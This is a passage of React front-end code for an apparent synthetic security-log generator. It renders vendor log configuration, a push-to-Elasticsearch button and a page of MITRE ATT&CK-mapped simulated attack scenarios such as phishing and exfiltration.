                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain} windowsLogTypes={windowsLogTypes} onWindowsLogTypes={handleWindowsLogTypes} hostnamePrefix={vendorHostnamePrefix[v.id]||''} onHostnamePrefix={handleHostnamePrefix} hostnameCap={vendorHostnameCap[v.id]??null} onHostnameCap={handleHostnameCap} includeAdmin={vendorIncludeAdmin[v.id]||false} onIncludeAdmin={handleIncludeAdmin} indexOverride={vendorIndexOverride[v.id]||''} onIndexOverride={handleIndexOverride}/>)}
                </div>
              </div>
              <div className="lg:col-span-1">
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Configuration</h2>
                <div className="sticky top-20 bg-gray-900 border border-gray-700 rounded-xl p-4 space-y-5">
                  <div className="space-y-2">
                    <div className="flex justify-between items-center">
                      <label className="text-xs text-gray-400">Max Total Logs</label>
                      <span className="text-sm font-mono font-semibold text-white">{maxLogs.toLocaleString()}</span>
                    </div>
                    <input type="number" min="1" max="10000" step="10" value={maxLogs} onChange={e=>setMaxLogs(Math.min(10000,Math.max(1,Number(e.target.value)||1)))} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
                    {(()=>{const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);return(<div className="flex justify-between text-[10px] text-gray-500"><span>min guaranteed: <span className={sum>maxLogs?'text-amber-400 font-semibold':''}>{sum.toLocaleString()}</span></span><span>max 10,000</span></div>);})()}
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-xs text-gray-400">Time Range</label>
                    <select value={timeRange} onChange={e=>setTimeRange(e.target.value)} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm text-gray-200 focus:outline-none focus:border-blue-500">
                      {[['15','Last 15 minutes'],['60','Last 1 hour'],['360','Last 6 hours'],['1440','Last 24 hours'],['10080','Last 7 days']].map(([v,l])=><option key={v} value={v}>{l}</option>)}
                    </select>
                  </div>
                  <Button onClick={handleGenerate} disabled={selected.length===0||generating} className="w-full">
                    {generating?'⟳ Generating…':`⚡ Generate ${selected.length>0?`${selected.length} Source${selected.length>1?'s':''}`:''}`}
                  </Button>
                  {selected.length===0&&<p className="text-xs text-gray-500 text-center">Select at least one log source</p>}
                </div>
              </div>
            </div>
            {Object.keys(logs).length>0&&(
              <div className="mt-8 space-y-3">
                <div className="flex items-center justify-between">
                  <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider">Output</h2>
                  <Button size="sm" variant="outline" onClick={handlePush} disabled={pushing} className="border-blue-500/30 text-blue-400 hover:bg-blue-500/10">
                    {pushing?'⟳ Pushing…':'⬆ Push to Elasticsearch'}
                  </Button>
                </div>
                <LogViewer logs={logs} vendorLabels={Object.fromEntries(VENDORS.map(v=>[v.id,v.name]))}/>
              </div>
            )}
          </div>
        </div>
      )}

      {page==='scenarios'&&(
        <div className="min-h-screen">
          <div className="border-b border-gray-800 bg-gradient-to-b from-red-500/5 to-transparent">
            <div className="max-w-4xl mx-auto px-4 py-8">
              <div className="flex items-center gap-3 mb-2">
                <div className="w-10 h-10 rounded-xl bg-red-500/20 flex items-center justify-center text-xl">🚨</div>
                <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Attack Scenarios</h1>
              </div>
              <p className="text-sm text-gray-400 max-w-lg">Generate correlated, multi-source attack scenarios with MITRE ATT&CK-mapped logs. Push directly to Elasticsearch.</p>
            </div>
          </div>
          <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
            {!elasticConfig?.url&&(
              <div className="flex items-start gap-3 p-4 rounded-xl bg-blue-500/5 border border-blue-500/20">
                <span className="text-blue-400 shrink-0 mt-0.5">ℹ</span>
                <p className="text-xs text-gray-400"><span className="text-blue-400 font-medium">Tip:</span> Configure your Elasticsearch connection (top-right) to enable direct push and curl commands.</p>
              </div>
            )}
            <div>
              <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Available Scenarios</h2>
              <div className="space-y-3">
                {SCENARIOS.map(s=>(
                  <div key={s.id} onClick={()=>handleScenario(s)} className={cn("p-5 rounded-xl border-2 cursor-pointer transition-all",activeScenario?.id===s.id?"border-red-500/50 bg-red-500/5":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
                    <div className="flex items-start gap-4">
                      <div className="w-11 h-11 rounded-xl bg-red-500/15 flex items-center justify-center text-xl shrink-0">
                        {s.id==='phishing'?'🎣':s.id==='phishing-lateral'?'🌐':s.id==='exfiltration'?'💾':'💀'}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-1">
                          <h3 className="font-semibold text-sm text-white">{s.name}</h3>
                          <Badge className="border-red-500/40 text-red-400 bg-red-500/10">{s.severity}</Badge>
                        </div>
                        <p className="text-xs text-gray-400 mb-2.5 leading-relaxed">{s.description}</p>
                        <div className="flex flex-wrap gap-1.5">
                          {s.tactics.map(t=><Badge key={t} className="border-gray-600 text-gray-400">{t}</Badge>)}
                        </div>
                      </div>
                      <button onClick={e=>{e.stopPropagation();handleScenario(s);}} className="shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 text-red-400 text-xs font-medium transition-colors">⚡ Run</button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            {activeScenario&&aptScenarioData&&(
              <div>
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
                <APTScenarioViewer scenario={activeScenario} data={aptScenarioData} elasticConfig={elasticConfig}/>
              </div>
            )}
            {activeScenario&&scenarioEvents.length>0&&(
              <div>
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
                <ScenarioViewer scenario={activeScenario} events={scenarioEvents} elasticConfig={elasticConfig}/>
              </div>
            )}
          </div>
        </div>
      )}

      <ConfigDialog open={configOpen} onClose={()=>setConfigOpen(false)} onSave={saveConfig}/>
    </div>
  );
}